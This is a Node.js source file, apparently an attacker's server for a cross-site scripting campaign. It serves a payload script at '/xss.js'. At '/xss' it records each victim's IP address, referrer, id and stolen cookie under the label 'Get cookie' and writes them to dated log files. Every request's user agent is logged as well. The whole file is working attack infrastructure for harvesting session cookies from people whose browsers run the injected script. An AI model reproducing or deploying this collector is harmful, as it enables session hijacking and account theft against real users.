var http = require('http');
var fs = require('fs');
var url = require('url');
var querystring = require('querystring');

function formatDate(date, style){   
	var y = date.getFullYear();
	var M = "0" + (date.getMonth() + 1);
	M = M.substring(M.length - 2);
	var d = "0" + date.getDate();
	d = d.substring(d.length - 2);
	var h = "0" + date.getHours();
	h = h.substring(h.length - 2);
	var m = "0" + date.getMinutes();
	m = m.substring(m.length - 2);
	var s = "0" + date.getSeconds();
	s = s.substring(s.length - 2);
	return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
};

function logIn(logContent){ //写入日志并输出控制台
	//TODO判断Log文件夹是否存在
	logFileName = "./Log/"+formatDate(new Date,"yyyy-MM-dd")+"Log.txt"; //日志文件例子:2014-11-29Log.txt
	fs.appendFile(logFileName,logContent, "utf-8" , function (err){
		if (err) throw err;
		console.log(logContent);
	});
};



function start(route) {
	var Website_port = 8081;	//网站所在端口号。

	function onRequest(request, response) {
		var resContent = "";
		var pathname = url.parse(request.url).pathname;
		if(pathname === "/favicon.ico")
		{
			var file_ = fs.readFileSync("./ocr_pi.png" , "binary");
			response.writeHead(200,{'Content-Type': 'image/png'});
			response.write(file_,"binary");
			response.end();
			return;
		}
		else if(pathname === "/xss")
		{
			requrl = request.url;
			args = url.parse(request.url,true).query;
			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " |Get cookie|";
			resContent += "	Source:	"+getClientIp(request);
			resContent += "	Refer:	"+requrl;
			resContent += "	ID:	"+args.id;
			resContent += "	Cookie:";
			resContent += "\n"+args.cookie+"\n";
			logIn(resContent);
			return;
		}
		else if(pathname === "/xss.js")
		{

			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
			resContent += "UA:	"+request.headers['user-agent']+ "	";
			var file_ =  fs.readFileSync("./xss.js", "utf-8");
			//TODO 文件读取异常处理
			response.writeHead(200, {'Content-Type': 'text/javascript'});
			response.write(file_, "utf-8");
			response.end();
			logIn(resContent);
			return;
		}
		else
		{	
			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
			resContent += "UA:	"+request.headers['user-agent']+ "	";
			logIn(resContent);
			return;
		}

		function getClientIp(req) {
			return req.headers['x-forwarded-for'] ||
			req.connection.remoteAddress ||
			req.socket.remoteAddress ||
			req.connection.socket.remoteAddress;
	    };


		response.writeHead(200,{'Content-Type': 'text/plain'});
		response.end("Hi! \n;D");

	
	}

	http.createServer(onRequest).listen(Website_port);
	logIn(formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + ' | Server started.Running at http://127.0.0.1:'+Website_port+'/');
}

exports.start = start;
